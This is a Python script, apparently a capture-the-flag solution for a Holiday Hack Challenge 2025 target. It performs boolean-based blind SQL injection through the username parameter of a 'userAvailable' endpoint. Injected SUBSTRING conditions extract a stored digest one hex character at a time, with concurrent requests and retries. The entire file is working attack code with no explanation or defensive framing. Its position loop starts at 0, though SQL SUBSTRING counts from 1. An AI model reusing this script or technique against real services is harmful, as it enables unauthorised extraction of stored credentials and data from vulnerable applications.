import urllib.parse
import httpx
import asyncio

BASE_URL = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable"
COOKIE = "connect.sid=s:<COOKIE>"
ID = "41d7ca7f-c2dd-424b-a1be-61d6627b519d"
USERNAME = "<USERNAME>"
HEXCHARS = "0123456789abcdefABCDEF"
DIGEST_LEN = 32

headers = {
    "Cookie": COOKIE,
    "User-Agent": "Mozilla"
}

MAX_RETRIES = 4
CONCURRENCY = 4
BACKOFF_BASE = 0.5

async def check(payload: str) -> bool:
    for attempt in range(MAX_RETRIES):
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                url = f"{BASE_URL}?username={urllib.parse.quote(payload)}&id={ID}"
                r = await client.get(url, headers=headers)
                return '"available":false' in r.text
        except httpx.RequestError:
            await asyncio.sleep(BACKOFF_BASE * (2 ** attempt))
    return False

async def extract_position(pos: int):
    sem = asyncio.Semaphore(CONCURRENCY)
    
    async def try_char(ch):
        inj = f'{USERNAME}" AND SUBSTRING(c.digest,{pos},1) = "{ch}" AND "x"="x'
        async with sem:
            if await check(inj):
                return ch
        return None
    
    tasks = [try_char(ch) for ch in HEXCHARS]
    for fut in asyncio.as_completed(tasks):
        result = await fut
        if result:
            return result
    return None

async def extract_digest():
    digest = ""
    for pos in range(0, DIGEST_LEN + 1):
        ch = await extract_position(pos)
        if not ch:
            print(f"[!] Failed at position {pos}, retrying...")
            await asyncio.sleep(1)
            ch = await extract_position(pos)
        if not ch:
            print(f"[X] Completely stuck at {pos}.")
            break
        digest += ch
        print(f"[{pos}/{DIGEST_LEN}] {ch}  →  {digest}")
    
    print("\nFinal digest:", digest)
    return digest

if __name__ == "__main__":
    asyncio.run(extract_digest())